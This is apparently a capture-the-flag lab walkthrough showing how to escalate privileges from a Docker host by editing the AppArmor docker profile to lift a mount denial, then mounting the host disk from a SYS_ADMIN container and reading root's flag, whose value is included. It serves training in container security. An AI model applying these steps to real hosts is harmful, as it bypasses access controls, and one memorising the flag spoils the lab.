# Attack Defense Lab
## Privilege Escalation I (AppArmor)

**Important Note** : This document illustrates all the important steps required to complete this lab. This  is  by no  means  a  comprehensive  step-by-step  solution for this exercise.  This  is only provided as a reference to various commands needed to complete this exercise and for your further  research on this topic. Also,  note that the IP addresses and domain names might be different in your lab.


The student user access is provided on a Docker host. The Docker daemon is using a TCP socket and only restricted functionality is exposed to non-root users. The AppArmor profiles are also deployed to confine the containers. The flag is kept in the home directory of the root user of the Docker host.

### Objective :  Elevate access and retrieve the flag!  
### Solution :

**Step 1**: Check the sudo privileges granted to the user.  
Command: `sudo -l`  
  
![01](files/img/01.jpg)


**Step 2**:  Check the listening sockets on the machine.  
Command: `netstat -tlpn`  

![02](files/img/02.jpg)  

**Step 3**:  It is mentioned in the challenge statement that Docker daemon is listening on TCP port. Port 22 belongs to the SSH server so the Docker socket is running on TCP port 2375. Set **DOCKER HOST** variable  
Command: `export DOCKER_HOST=localhost:2375`
  
![03](files/img/03.jpg)  
  
**Step 4**:​ List the containers running on the host.  
Command:​ `docker ps`  
  
![04](files/img/04.jpg) 
  
**Step 5**:​ Open another terminal (T2) and run tail on audit.log file. Also apply a filter to only viewapparmor logs.  
Command:​ `sudo /usr/bin/tail -f /var/log/audit/audit.log | grep apparmor`  
  
![05](files/img/05.jpg)  
  
**Step 6**:​ After trying to perform various operations on the docker, eventually it will be clear thatonly exec command is allowed by custom docker firewall. So, exec into the running container.  
Command:​ `docker exec -it 1664c45a8ada bash`  
  
![06](files/img/06.jpg)  


**Step 7**:​ Check the capabilities granted to the Docker container.  
Command:​ `capsh --print`  
  
![07](files/img/07.jpg)  
  
The container has multiple capabilities but mainly also has **SYS_ADMIN** capability that allowsthe user to perform multiple privileged operations.  
  
**Step 8**:​ Check the storage devices (disks) available on this machine.  
Command:​ `fdisk -l`  

![08](files/img/08.jpg)
    
One can observe that a disk of the host is attached to the container and is mounted at `/dev/sda`.  

**Step 9**:​ Try to mount it on /tmp directory.  
Command:​ `mount /dev/sda  /tmp/`  

![09](files/img/09.jpg)   
  
The attempt failed. As the container had the capability to perform this action, this is highly likelythat the apparmor has blocked this action.  

**Step 10​**: Check the logs appearing from `audit.log` file in terminal T2.  

![10](files/img/10.jpg)   

It is clear from the logs that apparmor has denied the mount operation for `docker` profile.  

**Step 11**:​ Change to apparmor profile directory and open the docker profile file using vim.  
Commands:  
```
cd /etc/apparmor.d/
sudo vim docker
```  
![11](files/img/11.jpg)   
  
In the profile file, the mount operation is denied.  

![11b](files/img/11b.jpg)   

Remove the `deny` string from the line. So, after modification the profile should appear asshown in the screenshot below :  

![11c](files/img/11c.jpg)   

**Step 12**:​ Reload the apparmor profile.  
Command:​ `sudo apparmor_parser -r docker`  

![12](files/img/12.jpg)   
  
**Step 13**:​ Now try to mount the disk again.  
Command:​ `mount /dev/sda /tmp/`  

![13](files/img/13.jpg)   
  
This time the operation succeeded.  

**Step 14**:​ Retrieve the flag from the home directory of the root user.  
Command: `​cat /tmp/root/flag`  

![14](files/img/14.jpg)   

Flag: `​a9a9bd74ce2bdb3ca85d44a9c0ed776a` 

References:  
● AppArmor man page(​http://manpages.ubuntu.com/manpages/bionic/man7/apparmor.7.html​)(​http://manpages.ubuntu.com/manpages/bionic/man5/apparmor.d.5.html​)  
  
● Beginning AppArmor profile development(​https://ubuntu.com/tutorials/beginning-apparmor-profile-development​)  
 

